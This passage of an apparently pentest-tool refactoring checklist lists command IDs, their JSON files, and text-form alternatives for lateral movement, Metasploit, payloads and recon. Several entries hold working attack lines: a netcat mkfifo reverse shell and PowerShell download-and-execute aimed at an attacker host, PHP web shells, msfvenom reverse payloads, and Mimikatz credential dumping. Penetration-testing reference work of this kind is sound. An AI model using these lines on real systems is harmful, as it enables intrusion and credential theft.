- [ ] **Action**: Replace with command IDs or create missing commands

### 81. `john-ssh-key-crack`

- [ ] **Command ID**: `john-ssh-key-crack`
- [ ] **File**: `enumeration/password-attacks-john.json`
- [ ] **Current alternatives (text)**:
  - `hashcat -m 22921 (aes-256-cbc only, NOT aes-256-ctr)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 82. `dcom-verify-rpc-port`

- [ ] **Command ID**: `dcom-verify-rpc-port`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current alternatives (text)**:
  - `sudo nmap -p 135 -Pn -v <TARGET> from Kali`
  - `crackmapexec smb <TARGET> for general connectivity test`
- [ ] **Action**: Replace with command IDs or create missing commands

### 83. `dcom-mmc20-calc-poc`

- [ ] **Command ID**: `dcom-mmc20-calc-poc`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current alternatives (text)**:
  - `wmi-new-cimsession for WMI-based execution`
  - `winrm-invoke-command if WinRM available`
  - `dcom-shellwindows for alternative DCOM object`
- [ ] **Action**: Replace with command IDs or create missing commands

### 84. `dcom-mmc20-revshell`

- [ ] **Command ID**: `dcom-mmc20-revshell`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current alternatives (text)**:
  - `wmi-powershell-revshell for WMI-based shell`
  - `winrm-revshell-invoke for WinRM-based shell`
  - `psexec-impacket-shell for direct SYSTEM shell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 85. `dcom-shellwindows`

- [ ] **Command ID**: `dcom-shellwindows`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current alternatives (text)**:
  - `dcom-mmc20-revshell (more reliable)`
  - `dcom-shellbrowserwindow (similar technique)`
  - `wmi-new-cimsession if WMI available`
- [ ] **Action**: Replace with command IDs or create missing commands

### 86. `dcom-shellbrowserwindow`

- [ ] **Command ID**: `dcom-shellbrowserwindow`
- [ ] **File**: `exploitation/ad-lateral-movement-dcom.json`
- [ ] **Current alternatives (text)**:
  - `dcom-mmc20-revshell (most reliable)`
  - `dcom-shellwindows (similar technique)`
  - `wmi-new-cimsession for WMI-based execution`
- [ ] **Action**: Replace with command IDs or create missing commands

### 87. `wmi-creds-pscredential`

- [ ] **Command ID**: `wmi-creds-pscredential`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current alternatives (text)**:
  - `Get-Credential for interactive prompt`
- [ ] **Action**: Replace with command IDs or create missing commands

### 88. `revshell-ps-generator`

- [ ] **Command ID**: `revshell-ps-generator`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current alternatives (text)**:
  - `Manual base64-encode-powershell with custom payload`
  - `PowerShell Empire for advanced payloads`
  - `Metasploit web_delivery module`
- [ ] **Action**: Replace with command IDs or create missing commands

### 89. `nc-listener-tcp`

- [ ] **Command ID**: `nc-listener-tcp`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current alternatives (text)**:
  - `rlwrap nc -lvnp <LPORT> for readline support (arrow keys, history)`
  - `pwncat-cs -lp <LPORT> for advanced features (file upload, persistence)`
  - `msfconsole exploit/multi/handler for Meterpreter shells`
- [ ] **Action**: Replace with command IDs or create missing commands

### 90. `verify-root-access`

- [ ] **Command ID**: `verify-root-access`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current alternatives (text)**:
  - `Get-ComputerInfo for detailed system information`
  - `systeminfo for full system details`
  - `net user <USERNAME> /domain for domain user info`
- [ ] **Action**: Replace with command IDs or create missing commands

### 91. `lateral-movement-port-check`

- [ ] **Command ID**: `lateral-movement-port-check`
- [ ] **File**: `exploitation/ad-lateral-movement-helpers.json`
- [ ] **Current alternatives (text)**:
  - `crackmapexec smb <TARGET> for comprehensive SMB/WinRM/LDAP check`
  - `Test-NetConnection <TARGET> -Port <PORT> from PowerShell for single port test`
- [ ] **Action**: Replace with command IDs or create missing commands

### 92. `overpass-net-use-trigger`

- [ ] **Command ID**: `overpass-net-use-trigger`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current alternatives (text)**:
  - `Access any network resource: dir \\<TARGET>\C$`
  - `Use hostname in UNC path: \\files04\share`
- [ ] **Action**: Replace with command IDs or create missing commands

### 93. `kerberos-klist-verify`

- [ ] **Command ID**: `kerberos-klist-verify`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current alternatives (text)**:
  - `Mimikatz: sekurlsa::tickets`
  - `Rubeus: klist`
- [ ] **Action**: Replace with command IDs or create missing commands

### 94. `passticket-mimikatz-export`

- [ ] **Command ID**: `passticket-mimikatz-export`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current alternatives (text)**:
  - `Rubeus dump for similar export`
  - `Invoke-Mimikatz for remote export`
- [ ] **Action**: Replace with command IDs or create missing commands

### 95. `passticket-mimikatz-inject`

- [ ] **Command ID**: `passticket-mimikatz-inject`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current alternatives (text)**:
  - `passticket-rubeus-ptt`
  - `Rubeus ptt /ticket:<FILE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 96. `kerberos-purge-tickets`

- [ ] **Command ID**: `kerberos-purge-tickets`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current alternatives (text)**:
  - `Mimikatz: kerberos::purge`
- [ ] **Action**: Replace with command IDs or create missing commands

### 97. `kerberos-troubleshoot-time`

- [ ] **Command ID**: `kerberos-troubleshoot-time`
- [ ] **File**: `exploitation/ad-lateral-movement-kerberos.json`
- [ ] **Current alternatives (text)**:
  - `w32tm /query /status`
  - `Get-Date for PowerShell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 98. `psexec-sysinternals-interactive`

- [ ] **Command ID**: `psexec-sysinternals-interactive`
- [ ] **File**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Current alternatives (text)**:
  - `psexec-sysinternals`
  - `rdp for GUI access`
- [ ] **Action**: Replace with command IDs or create missing commands

### 99. `psexec-verify-firewall`

- [ ] **Command ID**: `psexec-verify-firewall`
- [ ] **File**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Current alternatives (text)**:
  - `crackmapexec smb <TARGET> for SMB check`
  - `Test-NetConnection <TARGET> -Port 445 from PowerShell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 100. `cme-smb-shares`

- [ ] **Command ID**: `cme-smb-shares`
- [ ] **File**: `exploitation/ad-lateral-movement-psexec.json`
- [ ] **Current alternatives (text)**:
  - `smbclient -L //<TARGET> -U <USER>`
  - `smbmap -u <USER> -p <PASS> -H <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 101. `pth-cme-spray`

- [ ] **Command ID**: `pth-cme-spray`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current alternatives (text)**:
  - `pth-impacket-psexec per target`
  - `Manual testing with evil-winrm`
- [ ] **Action**: Replace with command IDs or create missing commands

### 102. `pth-cme-exec`

- [ ] **Command ID**: `pth-cme-exec`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current alternatives (text)**:
  - `pth-impacket-psexec`
  - `Use -X for PowerShell commands`
- [ ] **Action**: Replace with command IDs or create missing commands

### 103. `pth-verify-hash-format`

- [ ] **Command ID**: `pth-verify-hash-format`
- [ ] **File**: `exploitation/ad-lateral-movement-pth.json`
- [ ] **Current alternatives (text)**:
  - `evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH> for WinRM test`
- [ ] **Action**: Replace with command IDs or create missing commands

### 104. `evil-winrm-hash`

- [ ] **Command ID**: `evil-winrm-hash`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current alternatives (text)**:
  - `evil-winrm-creds`
  - `psexec-impacket-shell with -hashes`
  - `wmiexec with pass-the-hash`
- [ ] **Action**: Replace with command IDs or create missing commands

### 105. `test-wsman`

- [ ] **Command ID**: `test-wsman`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current alternatives (text)**:
  - `sudo nmap -p 5985,5986 -Pn -v <TARGET>`
  - `crackmapexec winrm <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 106. `winrm-revshell-invoke`

- [ ] **Command ID**: `winrm-revshell-invoke`
- [ ] **File**: `exploitation/ad-lateral-movement-winrm.json`
- [ ] **Current alternatives (text)**:
  - `wmi-powershell-revshell`
  - `evil-winrm-creds with manual shell upload`
- [ ] **Action**: Replace with command IDs or create missing commands

### 107. `wmi-powershell-revshell`

- [ ] **Command ID**: `wmi-powershell-revshell`
- [ ] **File**: `exploitation/ad-lateral-movement-wmi.json`
- [ ] **Current alternatives (text)**:
  - `wmi-impacket-exec with manual shell`
  - `winrm-invoke-revshell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 108. `wmi-verify-enabled`

- [ ] **Command ID**: `wmi-verify-enabled`
- [ ] **File**: `exploitation/ad-lateral-movement-wmi.json`
- [ ] **Current alternatives (text)**:
  - `Test-WSMan for WinRM testing`
- [ ] **Action**: Replace with command IDs or create missing commands

### 109. `mysql-connect-basic`

- [ ] **Command ID**: `mysql-connect-basic`
- [ ] **File**: `exploitation/database-access.json`
- [ ] **Current alternatives (text)**:
  - `mysql -h <TARGET> -u <USER> -p (interactive password prompt)`
  - `sqli-union-mysql-info (if SQL injection available)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 110. `postgres-connect-basic`

- [ ] **Command ID**: `postgres-connect-basic`
- [ ] **File**: `exploitation/database-access.json`
- [ ] **Current alternatives (text)**:
  - `postgres-direct-connect (with password inline)`
  - `sqli-union-postgresql-info (if SQL injection available)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 111. `nc-reverse-shell`

- [ ] **Command ID**: `nc-reverse-shell`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current alternatives (text)**:
  - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> <LPORT> >/tmp/f`
  - `nc <LHOST> <LPORT> | /bin/bash | nc <LHOST> <LPORT+1>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 112. `powershell-reverse-shell`

- [ ] **Command ID**: `powershell-reverse-shell`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current alternatives (text)**:
  - `powershell -exec bypass -f shell.ps1`
  - `powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')`
- [ ] **Action**: Replace with command IDs or create missing commands

### 113. `msfvenom-linux-elf`

- [ ] **Command ID**: `msfvenom-linux-elf`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current alternatives (text)**:
  - `msfvenom -p linux/x86/shell_reverse_tcp`
  - `msfvenom -p linux/x64/meterpreter/reverse_tcp`
- [ ] **Action**: Replace with command IDs or create missing commands

### 114. `msfvenom-windows-exe`

- [ ] **Command ID**: `msfvenom-windows-exe`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current alternatives (text)**:
  - `msfvenom -p windows/shell_reverse_tcp`
  - `msfvenom -p windows/meterpreter/reverse_tcp`
  - `msfvenom -p windows/x64/meterpreter/reverse_https`
- [ ] **Action**: Replace with command IDs or create missing commands

### 115. `searchsploit`

- [ ] **Command ID**: `searchsploit`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current alternatives (text)**:
  - `searchsploit -www <SERVICE>`
  - `searchsploit --nmap scan.xml`
  - `google: site:exploit-db.com <SERVICE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 116. `hydra-ssh`

- [ ] **Command ID**: `hydra-ssh`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current alternatives (text)**:
  - `medusa -h <TARGET> -u <USERNAME> -P <WORDLIST> -M ssh`
  - `crackmapexec ssh <TARGET> -u <USERNAME> -p <WORDLIST>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 117. `web-shell-php`

- [ ] **Command ID**: `web-shell-php`
- [ ] **File**: `exploitation/general.json`
- [ ] **Current alternatives (text)**:
  - `<?php echo shell_exec($_GET['cmd']); ?>`
  - `<?php eval($_POST['cmd']); ?>`
  - `<?php passthru($_REQUEST['cmd']); ?>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 118. `msf-search-auxiliary`

- [ ] **Command ID**: `msf-search-auxiliary`
- [ ] **File**: `exploitation/metasploit-auxiliary.json`
- [ ] **Current alternatives (text)**:
  - `ls /usr/share/metasploit-framework/modules/auxiliary/scanner/<SERVICE>/`
- [ ] **Action**: Replace with command IDs or create missing commands

### 119. `msf-aux-smb-version`

- [ ] **Command ID**: `msf-aux-smb-version`
- [ ] **File**: `exploitation/metasploit-auxiliary.json`
- [ ] **Current alternatives (text)**:
  - `nmap --script smb-protocols <TARGET>`
  - `smbclient -L //<TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 120. `msf-aux-smb-enumshares`

- [ ] **Command ID**: `msf-aux-smb-enumshares`
- [ ] **File**: `exploitation/metasploit-auxiliary.json`
- [ ] **Current alternatives (text)**:
  - `smbclient -L //<TARGET> -N`
  - `smbmap -H <TARGET>`
  - `enum4linux -S <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 121. `msf-aux-ssh-login`

- [ ] **Command ID**: `msf-aux-ssh-login`
- [ ] **File**: `exploitation/metasploit-auxiliary.json`
- [ ] **Current alternatives (text)**:
  - `hydra -l <USER> -P <WORDLIST> ssh://<TARGET>`
  - `medusa -u <USER> -P <WORDLIST> -h <TARGET> -M ssh`
- [ ] **Action**: Replace with command IDs or create missing commands

### 122. `msf-aux-mysql-login`

- [ ] **Command ID**: `msf-aux-mysql-login`
- [ ] **File**: `exploitation/metasploit-auxiliary.json`
- [ ] **Current alternatives (text)**:
  - `hydra -l root -P <WORDLIST> mysql://<TARGET>`
  - `nmap --script mysql-brute --script-args userdb=users.txt,passdb=<WORDLIST> <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 123. `msf-aux-ftp-version`

- [ ] **Command ID**: `msf-aux-ftp-version`
- [ ] **File**: `exploitation/metasploit-auxiliary.json`
- [ ] **Current alternatives (text)**:
  - `nmap -sV -p 21 <TARGET>`
  - `nc <TARGET> 21`
- [ ] **Action**: Replace with command IDs or create missing commands

### 124. `msf-aux-ftp-anonymous`

- [ ] **Command ID**: `msf-aux-ftp-anonymous`
- [ ] **File**: `exploitation/metasploit-auxiliary.json`
- [ ] **Current alternatives (text)**:
  - `ftp <TARGET> (login as: anonymous / anonymous)`
  - `nmap --script ftp-anon <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 125. `msf-aux-portscan-tcp`

- [ ] **Command ID**: `msf-aux-portscan-tcp`
- [ ] **File**: `exploitation/metasploit-auxiliary.json`
- [ ] **Current alternatives (text)**:
  - `nmap -p <PORTS> <TARGET>`
  - `masscan -p <PORTS> <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 126. `msf-aux-http-dir-scanner`

- [ ] **Command ID**: `msf-aux-http-dir-scanner`
- [ ] **File**: `exploitation/metasploit-auxiliary.json`
- [ ] **Current alternatives (text)**:
  - `gobuster dir -u http://<TARGET> -w <WORDLIST>`
  - `feroxbuster -u http://<TARGET> -w <WORDLIST>`
  - `dirb http://<TARGET> <WORDLIST>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 127. `msf-console-start`

- [ ] **Command ID**: `msf-console-start`
- [ ] **File**: `exploitation/metasploit-core.json`
- [ ] **Current alternatives (text)**:
  - `msfconsole`
  - `msfconsole -r <RESOURCE_SCRIPT>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 128. `msf-search-exploit`

- [ ] **Command ID**: `msf-search-exploit`
- [ ] **File**: `exploitation/metasploit-core.json`
- [ ] **Current alternatives (text)**:
  - `searchsploit <QUERY>`
  - `grep -r '<QUERY>' /usr/share/metasploit-framework/modules/exploits/`
- [ ] **Action**: Replace with command IDs or create missing commands

### 129. `msf-db-nmap`

- [ ] **Command ID**: `msf-db-nmap`
- [ ] **File**: `exploitation/metasploit-core.json`
- [ ] **Current alternatives (text)**:
  - `nmap <OPTIONS> <TARGET> -oX scan.xml && msf-db-import scan.xml`
- [ ] **Action**: Replace with command IDs or create missing commands

### 130. `msf-set-lhost`

- [ ] **Command ID**: `msf-set-lhost`
- [ ] **File**: `exploitation/metasploit-exploits.json`
- [ ] **Current alternatives (text)**:
  - `setg LHOST <IP> (for global setting)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 131. `msf-session-background`

- [ ] **Command ID**: `msf-session-background`
- [ ] **File**: `exploitation/metasploit-exploits.json`
- [ ] **Current alternatives (text)**:
  - `Ctrl+Z (interactive shortcut)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 132. `msf-handler-setup`

- [ ] **Command ID**: `msf-handler-setup`
- [ ] **File**: `exploitation/metasploit-handlers.json`
- [ ] **Current alternatives (text)**:
  - `nc -nvlp <LPORT> (for non-staged shells only)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 133. `msf-session-script`

- [ ] **Command ID**: `msf-session-script`
- [ ] **File**: `exploitation/metasploit-handlers.json`
- [ ] **Current alternatives (text)**:
  - `msf-session-interact + run <MODULE>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 134. `msf-session-kill`

- [ ] **Command ID**: `msf-session-kill`
- [ ] **File**: `exploitation/metasploit-handlers.json`
- [ ] **Current alternatives (text)**:
  - `exit (from within session)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 135. `meterpreter-help`

- [ ] **Command ID**: `meterpreter-help`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `help <COMMAND> (command-specific help)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 136. `meterpreter-background`

- [ ] **Command ID**: `meterpreter-background`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `Ctrl+Z (keyboard shortcut)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 137. `meterpreter-sysinfo`

- [ ] **Command ID**: `meterpreter-sysinfo`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `shell + systeminfo (Windows)`
  - `shell + uname -a (Linux)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 138. `meterpreter-getuid`

- [ ] **Command ID**: `meterpreter-getuid`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `shell + whoami`
- [ ] **Action**: Replace with command IDs or create missing commands

### 139. `meterpreter-getprivs`

- [ ] **Command ID**: `meterpreter-getprivs`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `shell + whoami /priv`
- [ ] **Action**: Replace with command IDs or create missing commands

### 140. `meterpreter-ps`

- [ ] **Command ID**: `meterpreter-ps`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `shell + tasklist (Windows)`
  - `shell + ps aux (Linux)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 141. `meterpreter-migrate`

- [ ] **Command ID**: `meterpreter-migrate`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `post/windows/manage/migrate (automated)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 142. `meterpreter-execute`

- [ ] **Command ID**: `meterpreter-execute`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `shell + start <PROGRAM>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 143. `meterpreter-shell`

- [ ] **Command ID**: `meterpreter-shell`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `execute -f cmd.exe -i (Windows)`
  - `execute -f /bin/bash -i (Linux)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 144. `meterpreter-pwd`

- [ ] **Command ID**: `meterpreter-pwd`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `getwd (alias)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 145. `meterpreter-ls`

- [ ] **Command ID**: `meterpreter-ls`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `dir (alias)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 146. `meterpreter-download`

- [ ] **Command ID**: `meterpreter-download`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `shell + certutil`
  - `shell + powershell download`
- [ ] **Action**: Replace with command IDs or create missing commands

### 147. `meterpreter-upload`

- [ ] **Command ID**: `meterpreter-upload`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `shell + certutil`
  - `shell + powershell IWR`
- [ ] **Action**: Replace with command IDs or create missing commands

### 148. `meterpreter-cat`

- [ ] **Command ID**: `meterpreter-cat`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `download + local cat`
- [ ] **Action**: Replace with command IDs or create missing commands

### 149. `meterpreter-search`

- [ ] **Command ID**: `meterpreter-search`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `shell + dir /s /b <PATTERN> (Windows)`
  - `shell + find -name <PATTERN> (Linux)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 150. `meterpreter-hashdump`

- [ ] **Command ID**: `meterpreter-hashdump`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `meterpreter-load-kiwi + lsa_dump_sam`
  - `shell + reg save HKLM\SAM`
- [ ] **Action**: Replace with command IDs or create missing commands

### 151. `meterpreter-kiwi-creds_all`

- [ ] **Command ID**: `meterpreter-kiwi-creds_all`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `creds_msv (for specific type)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 152. `meterpreter-route-add`

- [ ] **Command ID**: `meterpreter-route-add`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `route add <subnet> <netmask> <session_id> (from msfconsole)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 153. `meterpreter-portfwd-add`

- [ ] **Command ID**: `meterpreter-portfwd-add`
- [ ] **File**: `exploitation/metasploit-meterpreter.json`
- [ ] **Current alternatives (text)**:
  - `ssh -L port forwarding`
  - `chisel`
- [ ] **Action**: Replace with command IDs or create missing commands

### 154. `msfvenom-windows-reverse`

- [ ] **Command ID**: `msfvenom-windows-reverse`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `msfvenom -p windows/x64/meterpreter_reverse_tcp (Meterpreter instead)`
  - `manual-shellcode-generation`
- [ ] **Action**: Replace with command IDs or create missing commands

### 155. `msfvenom-windows-meterpreter`

- [ ] **Command ID**: `msfvenom-windows-meterpreter`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `windows/x64/meterpreter_reverse_tcp (TCP instead of HTTPS)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 156. `msfvenom-linux-reverse`

- [ ] **Command ID**: `msfvenom-linux-reverse`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `msfvenom -p linux/x64/meterpreter_reverse_tcp (Meterpreter variant)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 157. `msfvenom-php-reverse`

- [ ] **Command ID**: `msfvenom-php-reverse`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `php/reverse_php (simpler, no Meterpreter)`
  - `manual-php-reverse-shell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 158. `msfvenom-aspx-reverse`

- [ ] **Command ID**: `msfvenom-aspx-reverse`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `windows/meterpreter/reverse_tcp -f asp (for classic ASP)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 159. `msfvenom-jsp-reverse`

- [ ] **Command ID**: `msfvenom-jsp-reverse`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `msfvenom -p java/jsp_shell_reverse_tcp -f war (WAR file for manager deployment)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 160. `msfvenom-war-reverse`

- [ ] **Command ID**: `msfvenom-war-reverse`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `java/meterpreter/reverse_tcp -f war (Meterpreter variant)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 161. `msfvenom-python-reverse`

- [ ] **Command ID**: `msfvenom-python-reverse`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `python/meterpreter_reverse_tcp (Meterpreter features)`
  - `manual-python-reverse-shell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 162. `msfvenom-powershell-reverse`

- [ ] **Command ID**: `msfvenom-powershell-reverse`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `cmd/windows/reverse_powershell (CMD-compatible)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 163. `msfvenom-bash-reverse`

- [ ] **Command ID**: `msfvenom-bash-reverse`
- [ ] **File**: `exploitation/metasploit-payloads.json`
- [ ] **Current alternatives (text)**:
  - `cmd/unix/reverse (POSIX sh-compatible)`
  - `manual-bash-reverse-shell`
- [ ] **Action**: Replace with command IDs or create missing commands

### 164. `ssh-login-password`

- [ ] **Command ID**: `ssh-login-password`
- [ ] **File**: `exploitation/ssh-login.json`
- [ ] **Current alternatives (text)**:
  - `ssh <USERNAME>@<TARGET> (interactive password prompt)`
  - `hydra-ssh (for brute forcing multiple credentials)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 165. `nc-listener`

- [ ] **Command ID**: `nc-listener`
- [ ] **File**: `generated/exploitation-additions.json`
- [ ] **Current alternatives (text)**:
  - `rlwrap nc -lvnp <LPORT> (for better shell interaction)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 166. `php-http-server`

- [ ] **Command ID**: `php-http-server`
- [ ] **File**: `generated/file-transfer-additions.json`
- [ ] **Current alternatives (text)**:
  - `python3 -m http.server <PORT>`
  - `ruby-http-server`
- [ ] **Action**: Replace with command IDs or create missing commands

### 167. `ruby-http-server`

- [ ] **Command ID**: `ruby-http-server`
- [ ] **File**: `generated/file-transfer-additions.json`
- [ ] **Current alternatives (text)**:
  - `python3 -m http.server <PORT>`
  - `php-http-server`
- [ ] **Action**: Replace with command IDs or create missing commands

### 168. `powershell-wget`

- [ ] **Command ID**: `powershell-wget`
- [ ] **File**: `generated/file-transfer-additions.json`
- [ ] **Current alternatives (text)**:
  - `powershell-invoke-webrequest`
  - `certutil -urlcache -f http://<LHOST>/<FILE> <DEST>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 169. `medusa-ssh`

- [ ] **Command ID**: `medusa-ssh`
- [ ] **File**: `generated/password-attacks-additions.json`
- [ ] **Current alternatives (text)**:
  - `hydra -L <USERLIST> -P <PASSLIST> ssh://<TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 170. `medusa-smb`

- [ ] **Command ID**: `medusa-smb`
- [ ] **File**: `generated/password-attacks-additions.json`
- [ ] **Current alternatives (text)**:
  - `crackmapexec smb <TARGET> -u <USERLIST> -p <PASSLIST>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 171. `suid-find`

- [ ] **Command ID**: `suid-find`
- [ ] **File**: `generated/privilege-escalation-additions.json`
- [ ] **Current alternatives (text)**:
  - `find / -perm -4000 2>/dev/null (octal notation)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 172. `cron-enum`

- [ ] **Command ID**: `cron-enum`
- [ ] **File**: `generated/privilege-escalation-additions.json`
- [ ] **Current alternatives (text)**:
  - `ls -la /etc/cron.* (check cron directories)`
  - `pspy64 (monitor without root)`
  - `grep -r CRON /var/log/ (check logs)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 173. `enum4linux-smb`

- [ ] **Command ID**: `enum4linux-smb`
- [ ] **File**: `generated/recon-additions.json`
- [ ] **Current alternatives (text)**:
  - `enum4linux-ng`
  - `crackmapexec smb <TARGET>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 174. `dig-zone-transfer`

- [ ] **Command ID**: `dig-zone-transfer`
- [ ] **File**: `generated/recon-additions.json`
- [ ] **Current alternatives (text)**:
  - `dnsrecon -t axfr -d <DOMAIN>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 175. `dnsrecon-domain`

- [ ] **Command ID**: `dnsrecon-domain`
- [ ] **File**: `generated/recon-additions.json`
- [ ] **Current alternatives (text)**:
  - `dnsenum <DOMAIN>`
  - `dig-zone-transfer`
- [ ] **Action**: Replace with command IDs or create missing commands

### 176. `tail-follow-filter`

- [ ] **Command ID**: `tail-follow-filter`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `journalctl -f | grep <PATTERN>`
- [ ] **Action**: Replace with command IDs or create missing commands

### 177. `tail-follow-multiple`

- [ ] **Command ID**: `tail-follow-multiple`
- [ ] **File**: `monitoring/log-monitoring.json`
- [ ] **Current alternatives (text)**:
  - `multitail <FILE1> <FILE2> (if installed)`
- [ ] **Action**: Replace with command IDs or create missing commands

### 178. `journalctl-follow`

- [ ] **Command ID**: `journalctl-follow`
